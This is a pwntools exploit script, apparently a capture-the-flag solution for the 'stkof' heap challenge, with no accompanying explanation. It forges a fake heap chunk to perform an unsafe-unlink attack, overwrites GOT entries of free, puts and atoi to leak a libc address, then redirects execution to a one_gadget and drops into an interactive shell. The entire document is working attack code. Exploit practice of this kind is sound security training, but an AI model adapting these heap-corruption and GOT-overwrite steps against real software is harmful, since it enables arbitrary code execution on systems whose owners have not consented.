from pwn import *
context(
	log_level='debug',
	binary='./stkof'
)
e=context.binary
libc=e.libc
io=process()
# io=process('books',env={"LD_PRELOAD":"libc.so.6"})

#=========================================
#Function

def dbg(script=''):
	gdb.attach(io,gdbscript=script)

def menu(func):
	io.sendline(str(func))

def alloc(size):
	menu(1)
	io.sendline(str(size))
	io.recvuntil('OK\n')

def fill(num,size,content):
	menu(2)
	io.sendline(str(num))
	io.sendline(str(size))
	io.sendline(str(content))
	io.recvuntil('OK\n')

def free(num):
	menu(3)
	io.sendline(str(num))

def pr(num):
	menu(4)
	io.sendline(str(num))


#=========================================
#VAR
libc_off = 456336
globals = 0x602140
free_addr = e.got['free']
puts_addr = e.got['puts']
atoi_addr = e.got['atoi']
success('free_addr: ' + hex(free_addr))
success('puts_addr: ' + hex(puts_addr))
success('atoi_addr: ' + hex(atoi_addr))
gadget = [283158,283242,983716,987463]

#=========================================
alloc(0x400) #1
alloc(0x30) #2
alloc(0x80) #3
payload = p64(0)+p64(0x20)+p64(globals+16-0x18)+p64(globals+16-0x10)+p64(0x20)
payload = payload.ljust(0x30, 'a')
payload += p64(0x30)+p64(0x90)
# dbg()
# raw_input()

fill(2,len(payload),payload)
raw_input()
free(3)

payload = 'a'*8 + p64(free_addr) + p64(puts_addr) + p64(atoi_addr)
fill(2,len(payload),payload)
io.recv()
payload = p64(e.plt['puts'])
fill(0, len(payload), payload)
free(1)
io.recv()
libc_leak =  u64(io.recvuntil('\x0a')[:-1].ljust(8,'\x00'))
success("libc_leak: "+hex(libc_leak))

libc.address= libc_leak - libc_off
success("libc.address: "+hex(libc.address))

one_gadget = gadget[2] + libc.address
payload = p64(one_gadget)
fill(2, len(payload), payload)
# free(2)
pr(1)
# dbg()
io.interactive()
